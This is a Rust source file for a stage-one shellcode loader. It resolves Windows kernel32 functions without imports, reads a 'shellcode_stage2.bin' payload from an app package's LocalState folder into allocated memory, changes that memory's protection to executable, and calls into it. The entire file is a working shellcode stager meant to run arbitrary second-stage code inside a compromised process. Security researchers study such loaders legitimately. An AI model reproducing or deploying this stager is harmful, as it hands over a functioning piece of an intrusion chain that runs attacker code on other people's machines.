#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(non_upper_case_globals)]
#![allow(overflowing_literals)]
#![no_std]
#![no_main]
use core::arch::asm;
use core::panic::PanicInfo;

use shellcode_utils::prelude::*;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

type Stage2Fn = fn() -> u32;

#[no_mangle]
pub extern "C" fn main() -> u32 {
    // unsafe {
    //     asm!("int 3");
    // }
    // unsafe {
    //     // clean argc and argv
    //     asm!("mov rcx, 0", "mov rdx, 0",);
    // }
    let kernel32_ptr = get_kernel32();

    unsafe { asm!("and rsp, ~0xf") };

    let ReadFile = fetch_read_file(kernel32_ptr);
    let CreateFileA = fetch_create_file(kernel32_ptr);
    let VirtualAlloc = fetch_virtual_alloc(kernel32_ptr);
    let VirtualProtect = fetch_virtual_protect(kernel32_ptr);
    let GetFileSize = fetch_get_file_size(kernel32_ptr);

    // let wsprintfa_ptr = get_func_by_name(u32_dll, wsprintfa_.as_ptr());
    // if wsprintfa_ptr.is_null() {
    //     unsafe {
    //         asm!("int 3");
    //     }
    // }
    // let wsprintfa: wsprintfaFn = unsafe { core::mem::transmute(wsprintfa_ptr) };

    let stage2_filename = concat!(
        r#"C:\Users\lander\AppData\Local\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState\shellcode_stage2.bin"#,
        "\0"
    );

    // Open the stage2 payload
    let handle = unsafe {
        CreateFileA(
            stage2_filename.as_ptr() as *const i8,
            CreateFileAccess::GenericRead as u32,
            0,
            core::ptr::null_mut() as PVOID,
            4,    // OPEN_ALWAYS
            0x80, // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut() as PVOID,
        )
    };

    let stage2_size = unsafe { GetFileSize(handle, core::ptr::null_mut()) };

    // Allocate memory for the stage 2 payload
    let stage2_data =
        unsafe { VirtualAlloc(core::ptr::null_mut(), stage2_size as usize, 0x3000, 4) };

    // Read the data from disk
    unsafe {
        ReadFile(
            handle,
            stage2_data,
            stage2_size,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    };

    let mut old_flags = 0u32;

    // Change the stage 2 payload's permissions
    unsafe {
        VirtualProtect(
            stage2_data,
            stage2_size as usize,
            0x20,
            &mut old_flags as *mut _,
        )
    };

    // %p\n0>>>>>>>>>>>>>>>>
    // let format_string = concat!("%p", "\n\0");

    // let mut buf = [0u8; 20];
    // wsprintfa(
    //     buf.as_mut_ptr() as LPSTR,
    //     format_string.as_ptr() as LPCSTR,
    //     handle,
    // );

    let OutputDebugStringA = fetch_output_debug_string(kernel32_ptr);
    macro_rules! debug_print {
        ($msg:expr) => {
            unsafe { OutputDebugStringA(concat!($msg, "\n\0").as_ptr() as _) }
        };
    }

    debug_print!("Hello from stage1");

    let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_data) };
    stage2()
}

// #[allow(unused_attributes)]
// #[cfg(target_env = "msvc")]
// #[link_args = "/GS- /MERGE:.rdata=.text /MERGE:.pdata=.text /NODEFAULTLIB /EMITPOGOPHASEINFO /DEBUG:NONE"]
// extern "C" {}
